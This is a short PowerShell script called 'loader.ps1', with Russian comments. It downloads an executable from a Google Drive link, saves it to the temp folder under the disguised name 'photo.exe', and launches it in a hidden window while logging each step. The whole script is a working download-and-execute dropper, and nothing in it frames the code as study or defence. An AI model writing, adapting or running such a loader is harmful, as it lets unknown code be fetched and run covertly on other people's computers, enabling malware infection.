# loader.ps1
$url = "https://drive.google.com/uc?export=download&id=1tUR-oTx28YIm-7hIDeoLnDpRoTec0-bQ"
$path = "$env:TEMP\photo.exe"

# Логируем
"Starting download..." | Out-File "$env:TEMP\log.txt" -Append

# Качаем
(New-Object Net.WebClient).DownloadFile($url, $path)

# Проверяем скачался ли файл
if (Test-Path $path) {
    "File downloaded successfully, size: $((Get-Item $path).Length) bytes" | Out-File "$env:TEMP\log.txt" -Append
    
    # Запускаем
    $process = Start-Process -FilePath $path -WindowStyle Hidden -PassThru
    "Process started with PID: $($process.Id)" | Out-File "$env:TEMP\log.txt" -Append
} else {
    "File download failed!" | Out-File "$env:TEMP\log.txt" -Append
}
